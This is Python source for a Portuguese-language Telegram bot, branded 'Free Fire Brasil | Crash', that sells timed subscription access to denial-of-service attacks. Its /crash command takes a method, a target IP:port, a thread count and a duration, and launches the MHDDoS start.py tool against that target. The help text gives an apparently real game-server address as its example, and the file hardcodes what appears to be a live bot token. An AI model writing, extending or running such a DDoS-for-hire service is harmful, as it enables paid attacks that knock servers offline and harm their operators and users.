import telebot
import subprocess
import sqlite3
from datetime import datetime, timedelta
from threading import Lock
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "8007756691:AAFjqKWLFnf6thZh76NzdyQjexOkKiTzmEk"
ADMIN_ID = 7080719747
START_PY_PATH = "/workspaces/MHDDoS/start.py"

bot = telebot.TeleBot(BOT_TOKEN)
db_lock = Lock()
cooldowns = {}
active_attacks = {}

conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute(
    """
    CREATE TABLE IF NOT EXISTS vip_users (
        id INTEGER PRIMARY KEY,
        telegram_id INTEGER UNIQUE,
        expiration_date TEXT
    )
    """
)
conn.commit()


@bot.message_handler(commands=["start"])
def handle_start(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()


    if result:
        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            vip_status = "🎁 Seu plano expirou-se."
        else:
            dias_restantes = (expiration_date - datetime.now()).days
            vip_status = (
                f"✨️ Você é assinante de um plano!\n"
                f"⏳ Dias restantes: {dias_restantes} dia(s)\n"
                f"📅 Expira em: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}\n\n"
                f"🎉 Obrigado por ser assinante!"
            )
    else:
        vip_status = "😔 Ops... você não tem um plano ativo!"
    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="Adiquirir Base",
        url=f"tg://user?id=7310209040"

    )
    markup.add(button)
    
    bot.reply_to(
        message,
        (
            "👋🏻 *Bem-vindo(a) ao Free Fire Brasil | Crash, O Melhor bot de crash brasileiro atualmente!*"
            

            f"""
```
{vip_status}```\n"""
            "🧐 *Como usar?*"
            """
```
/crash <Tipo> <IP/Host:Port> <Threads> <ms>```\n"""
            "💡 *Exemplo:*"
            """
```
/crash UDP 143.92.125.230:10013 10 900```\n\n"""
            "🔔 *Não remova os créditos! Porfavor. 🫠*\n"
            "👑 *Desenvolvedor da Base:* @lukeewqz7"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.message_handler(commands=["adicionarplano"])
def handle_addvip(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Não é permitido usar esse tipo de comando.")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(
            message,
            "❌ Formato inválido, use: `/adicionarplano <ID> <Quantos dias>`",
            parse_mode="Markdown",
        )
        return

    telegram_id = args[1]
    days = int(args[2])
    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    with db_lock:
        cursor.execute(
            """
            INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
            VALUES (?, ?)
            """,
            (telegram_id, expiration_date),
        )
        conn.commit()

    bot.reply_to(message, f"🎉 O Usuário {telegram_id} Tornou-se um assinante por {days} dia(s).")


@bot.message_handler(commands=["crash"])
def handle_ping(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if not result:
        bot.reply_to(message, "❌ Não é permitido usar esse tipo de comando.")
        return

    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration_date:
        bot.reply_to(message, "😱 Seu plano expirou-se.")
        return

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 5:
        bot.reply_to(message, "🔧 Espere 5 segundos antes de iniciar outro ataque.")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "*Formato incorreto/inválido!*\n\n"
                "📌 *Uso correto:*\n"
                """
```
/crash <Tipo> <IP/Host:Port> <Threads> <ms>```\n\n"""
                "💡 *Exemplo:*\n"
                """
```
/crash UDP 143.92.125.230:10013 10 900```\n\n"""
                "👑 *Desenvolvedor da Base:* @lukeewqz7"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = args[3]
    duration = args[4]
    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    active_attacks[telegram_id] = process
    cooldowns[telegram_id] = time.time()

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("Parar Ataque", callback_data=f"stop_{telegram_id}"))

    bot.reply_to(
        message,
        (
            "*Ataque foi iniciado com sucesso!*\n\n"
            f"🌐 *IP/Host:Port:* {ip_port}\n"
            f"⚙️ *Tipo:* {attack_type}\n"
            f"🧟 *Threads:* {threads}\n"
            f"⏳ *Tempo (ms):* {duration}\n\n"
            f"👑 *Desenvolvedor da Base:* @lukeewqz7"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(
            call.id, "❌ Apenas o usuário que iniciou pode para-lo."
        )
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        bot.answer_callback_query(call.id, "✅ Ataque parado com éxito.")
        bot.edit_message_text(
            "*⛔️ Ataque finalizado com sucesso!*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "❌ Não foi encontrado nenhum ataque ativo no momento.")

if __name__ == "__main__":
    bot.infinity_polling()
